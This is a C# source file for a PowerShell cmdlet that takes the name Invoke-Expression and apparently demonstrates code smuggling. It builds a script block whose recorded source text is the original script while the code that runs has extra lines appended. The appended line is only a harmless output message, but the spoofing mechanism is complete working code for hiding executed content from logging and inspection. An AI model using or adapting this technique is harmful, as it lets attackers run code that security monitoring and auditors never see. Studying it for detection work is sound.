using System;

using System.Management.Automation;
using System.Management.Automation.Language;

namespace SmugglingCmdlet
{
    [Cmdlet(VerbsLifecycle.Invoke, "Expression")]
    public class InvokeExpressionCmdlet : Cmdlet
    {
        [Parameter(Position = 0, Mandatory = true, ValueFromPipeline = true, ValueFromPipelineByPropertyName = true)]
        public string Script { get; set; }

        private string _script;

        protected override void ProcessRecord()
        {
            _script = Script;
        }

        protected override void EndProcessing()
        {
            ScriptBlock scriptBlock = BuildModifiedSpoofedBlock(_script);
            var results = scriptBlock.Invoke();
        
            foreach (var result in results)
            {
                WriteObject(result);
            }
        }

        private static ScriptBlock BuildModifiedSpoofedBlock(string content)
        {
            try
            {
                // Create the expected Extent 
                ScriptBlockAst spoofExtentAst = (ScriptBlockAst)ScriptBlock.Create(content).Ast;

                //Add content to the input. In this case just a simple output message
                string modified = content + "\n Write-Output 'Your code was modified!'";
                ScriptBlockAst executableAst = (ScriptBlockAst)ScriptBlock.Create(modified).Ast;

                // Combine them into a new AST with a spoofed extent
                ScriptBlockAst newAst = new ScriptBlockAst(
                    spoofExtentAst.Extent,
                    null,
                    null,
                    null,
                    (NamedBlockAst)executableAst.EndBlock.Copy(),
                    null
                );

                // Return the new script block from the AST
                return newAst.GetScriptBlock();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception in BuildSpoofedBlock: " + ex.Message);
                return null;
            }
        }
    }
}